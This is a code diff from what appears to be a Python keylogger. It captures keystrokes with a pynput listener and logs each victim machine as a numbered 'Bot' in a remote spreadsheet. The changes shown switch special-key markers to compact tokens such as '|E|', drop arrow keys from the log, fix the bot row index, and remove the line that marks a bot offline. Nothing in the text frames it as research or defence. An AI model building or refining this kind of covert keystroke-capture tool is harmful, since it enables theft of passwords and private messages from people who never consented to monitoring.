@@ -14,7 +14,7 @@ current_cell = 2
 
 for celli in range(1, 17):
     if sheet.cell(1, celli).value == '':
-        current_row = celli - 1
+        current_row = celli
         break
 
     if celli == 16:
@@ -39,15 +39,15 @@ def filter_spaces(character):
         return ' '
 
     elif character == Key.enter:
-        return '/ENTER/'
+        return '|E|'
 
     elif character == Key.shift:
-        return '/SHIFT/'
+        return '|S|'
 
     elif character == Key.backspace:
-        return '\b'
+        return '|B|'
 
-    elif character in (Key.tab, Key.alt_r, Key.alt_l, Key.ctrl_l, Key.ctrl_r, Key.num_lock, Key.caps_lock):
+    elif character in (Key.left, Key.right, Key.up, Key.down, Key.tab, Key.alt_r, Key.alt_l, Key.ctrl_l, Key.ctrl_r, Key.num_lock, Key.caps_lock):
         return ''
 
     else:
@@ -72,5 +72,3 @@ def on_release(key):
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
-
-sheet.update_cell(1, current_row, f'Bot {current_row} Offline')
